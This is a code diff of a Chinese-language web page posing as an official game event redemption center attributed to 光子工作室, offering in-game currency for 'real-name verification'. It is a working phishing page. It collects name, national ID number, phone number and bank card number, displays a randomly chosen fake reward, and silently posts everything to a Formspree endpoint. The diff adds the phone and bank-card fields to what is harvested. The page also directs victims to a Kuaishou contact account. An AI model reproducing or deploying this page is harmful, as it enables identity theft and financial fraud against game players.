@@ -2,38 +2,37 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>活动兑换中心</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: "微软雅黑", sans-serif;
+      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      background-size: 600% 600%;
+      animation: gradient 15s ease infinite;
       color: #fff;
-      background: linear-gradient(120deg, #0f172a, #1e293b);
-      background-size: 400% 400%;
-      animation: gradientBG 10s ease infinite;
     }
 
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    @keyframes gradient {
+      0% { background-position: 0% 50% }
+      50% { background-position: 100% 50% }
+      100% { background-position: 0% 50% }
     }
 
     .container {
       max-width: 500px;
-      margin: 40px auto;
-      background: rgba(0,0,0,0.6);
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 12px #00bcd4;
+      margin: 60px auto;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #00c3ff;
     }
 
     h1 {
       text-align: center;
       margin-bottom: 20px;
-      color: #00eaff;
+      color: #00c3ff;
     }
 
     label {
@@ -42,17 +41,16 @@
       font-size: 16px;
     }
 
-    label span {
+    label .required {
       color: red;
-      margin-right: 5px;
     }
 
     input, select {
       width: 100%;
       padding: 10px;
-      margin-top: 5px;
-      border: none;
+      margin-top: 6px;
       border-radius: 5px;
+      border: none;
       font-size: 16px;
     }
 
@@ -62,151 +60,160 @@
       margin-top: 5px;
     }
 
-    .success-box {
-      margin-top: 20px;
-      background: rgba(0,255,255,0.1);
-      padding: 15px;
-      border: 1px solid #00eaff;
-      border-radius: 5px;
-      text-align: center;
-    }
-
     button {
-      margin-top: 20px;
       width: 100%;
       padding: 12px;
-      background-color: #00bcd4;
+      margin-top: 20px;
+      background: #00c3ff;
       border: none;
       border-radius: 5px;
-      font-size: 18px;
       color: white;
+      font-size: 18px;
       cursor: pointer;
     }
 
     button:disabled {
-      background-color: gray;
+      background: gray;
       cursor: not-allowed;
     }
 
-    .announcement, .disclaimer, .notice {
-      margin-top: 30px;
-      padding: 10px;
-      background: rgba(255,255,255,0.1);
-      border-left: 4px solid #00eaff;
+    .message {
+      margin-top: 20px;
+      padding: 15px;
+      background: #001f3f;
+      border-left: 5px solid #00c3ff;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px;
       font-size: 14px;
+      color: #ccc;
+    }
+
+    .footer span {
+      display: inline-block;
+      margin-top: 10px;
+    }
+
+    .announcement {
+      background: rgba(0,0,0,0.3);
+      margin-top: 30px;
+      padding: 15px;
+      border: 1px solid #00c3ff;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>活动兑换中心</h1>
-    <form id="claimForm">
-      <label><span>*</span>选择区服</label>
-      <select id="zone" required>
+    <form id="rewardForm">
+      <label><span class="required">*</span> 选择区服</label>
+      <select name="server" required>
         <option value="">请选择</option>
-        <option>微信区</option>
-        <option>QQ区</option>
+        <option value="微信">微信</option>
+        <option value="QQ">QQ</option>
       </select>
-      <div id="zoneError" class="error"></div>
 
-      <label><span>*</span>游戏昵称</label>
-      <input type="text" id="nickname" placeholder="请输入游戏昵称"/>
-      <div id="nicknameError" class="error"></div>
+      <label><span class="required">*</span> 游戏昵称</label>
+      <input type="text" name="nickname" required />
 
-      <label><span>*</span>真实姓名</label>
-      <input type="text" id="realName" placeholder="请输入真实姓名"/>
+      <label><span class="required">*</span> 姓名</label>
+      <input type="text" name="realname" required />
       <div id="nameError" class="error"></div>
 
-      <label><span>*</span>身份证号</label>
-      <input type="text" id="idCard" placeholder="请输入18位身份证号"/>
+      <label><span class="required">*</span> 身份证号</label>
+      <input type="text" name="idcard" required />
       <div id="idError" class="error"></div>
+
+      <label><span class="required">*</span> 手机号</label>
+      <input type="tel" name="phone" required />
+
+      <label><span class="required">*</span> 银行卡号</label>
+      <input type="text" name="bankcard" required />
 
       <button type="submit" id="submitBtn">提交认证</button>
     </form>
 
-    <div class="success-box" id="successBox" style="display:none;">
-      <p id="resultText">您已成功提交认证，请勿重复提交</p>
-      <p id="rewardText">恭喜获得60点券，点券将在24小时内到账</p>
-    </div>
+    <div class="message" id="resultBox" style="display:none;"></div>
 
     <div class="announcement">
-      <strong>活动公告：</strong><br/>
-      1. 本次活动认证成功可获得60、300、680、1280、1980、3280、6480点卷奖励；<br/>
-      2. 实名认证成功后还可抽取载具皮肤与兑换钥匙，最少为兑换钥匙*1；<br/>
-      3. 认证奖励将在24小时内到账，请确保信息填写无误；<br/>
-      4. 每个游戏账号仅限参与一次，重复提交将失去奖励资格；<br/>
+      <strong>活动公告：</strong><br>
+      1. 本次活动认证成功可获得60、300、680、1280、1980、3280、6480点卷奖励；<br>
+      2. 实名认证成功后还可抽取载具皮肤与兑换钥匙，最少为兑换钥匙*1；<br>
+      3. 认证奖励将在24小时内到账，请确保信息填写无误；<br>
+      4. 每个游戏账号仅限参与一次，重复提交将失去奖励资格；<br>
       5. 活动最终解释权归光子工作室所有。
-    </div>
-
-    <div class="notice">
-      <strong>提示：</strong>多次提交冒领奖励查出将给予封号处理。
-    </div>
-
-    <div class="disclaimer">
-      活动最终解释权归光子工作室所有。
     </div>
   </div>
 
-  <script>
-    const form = document.getElementById("claimForm");
-    const submitBtn = document.getElementById("submitBtn");
+  <div class="footer">
+    © 活动最终解释权归光子工作室所有 |
+    <span id="copyText" onclick="copyID()">派送员快手账号：Call_Aj6（点击复制）</span><br>
+    <span style="color:red;">多次提交冒领奖励查出将给予封号处理</span>
+  </div>
 
-    if (localStorage.getItem("claimed")) {
-      document.getElementById("claimForm").style.display = "none";
-      document.getElementById("successBox").style.display = "block";
+  <script>
+    function copyID() {
+      navigator.clipboard.writeText("Call_Aj6")
+        .then(() => alert("快手账号已复制！"))
+        .catch(() => alert("复制失败，请手动复制"));
     }
 
-    form.addEventListener("submit", async function(e) {
+    const form = document.getElementById('rewardForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultBox = document.getElementById('resultBox');
+
+    const nameError = document.getElementById('nameError');
+    const idError = document.getElementById('idError');
+
+    const isChineseName = name => /^[\u4e00-\u9fa5]{1,5}$/.test(name);
+    const isValidID = id => /^[1-9]\d{16}[\dXx]$/.test(id);
+
+    if (localStorage.getItem("submitted") === "true") {
+      submitBtn.disabled = true;
+      resultBox.style.display = "block";
+      resultBox.innerHTML = `您已成功提交认证，请勿重复提交。<br><br><strong>恭喜获得 ${localStorage.getItem("reward")} 点卷</strong>，点卷将在24小时之内到达。<br><br>奖励内容：火焰刀-维列*1、机械拳套-破风*1、双截棍-神龙*1、车币*3`;
+    }
+
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // 清除错误信息
-      document.querySelectorAll(".error").forEach(el => el.textContent = "");
+      const realname = form.realname.value.trim();
+      const idcard = form.idcard.value.trim();
 
-      const zone = document.getElementById("zone").value;
-      const nickname = document.getElementById("nickname").value;
-      const realName = document.getElementById("realName").value;
-      const idCard = document.getElementById("idCard").value;
+      nameError.textContent = "";
+      idError.textContent = "";
 
-      let valid = true;
-
-      if (!zone) {
-        document.getElementById("zoneError").textContent = "请选择区服";
-        valid = false;
+      if (!isChineseName(realname)) {
+        nameError.textContent = "姓名应为1到5位中文字符";
+        return;
       }
 
-      if (!/^[\u4e00-\u9fa5]{1,5}$/.test(realName)) {
-        document.getElementById("nameError").textContent = "请输入1~5个中文字符";
-        valid = false;
+      if (!isValidID(idcard)) {
+        idError.textContent = "请输入正确的18位身份证号";
+        return;
       }
 
-      if (!/^\d{17}[\dXx]$/.test(idCard)) {
-        document.getElementById("idError").textContent = "身份证号格式错误，必须为18位";
-        valid = false;
-      }
-
-      if (!valid) return;
-
-      // 模拟概率
       const reward = Math.random() < 0.01 ? 300 : 60;
+      localStorage.setItem("submitted", "true");
+      localStorage.setItem("reward", reward);
 
-      // 禁止重复提交
-      localStorage.setItem("claimed", "true");
+      submitBtn.disabled = true;
+      resultBox.style.display = "block";
+      resultBox.innerHTML = `您已成功提交认证，请勿重复提交。<br><br><strong>恭喜获得 ${reward} 点卷</strong>，点卷将在24小时之内到达。<br><br>奖励内容：火焰刀-维列*1、机械拳套-破风*1、双截棍-神龙*1、车币*3`;
 
-      // 展示结果
-      document.getElementById("claimForm").style.display = "none";
-      document.getElementById("successBox").style.display = "block";
-      document.getElementById("rewardText").textContent = `恭喜获得${reward}点券，点券将在24小时内到账`;
-
-      // 提交到 Formspree
-      await fetch("https://formspree.io/f/mqabzblz", {
+      // 提交至 formspree
+      fetch("https://formspree.io/f/mqabzblz", {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          区服: zone,
-          昵称: nickname,
-          姓名: realName,
-          身份证号: idCard,
-          奖励: reward + "点券"
+          server: form.server.value,
+          nickname: form.nickname.value,
+          realname,
+          idcard,
+          phone: form.phone.value,
+          bankcard: form.bankcard.value
         })
       });
     });
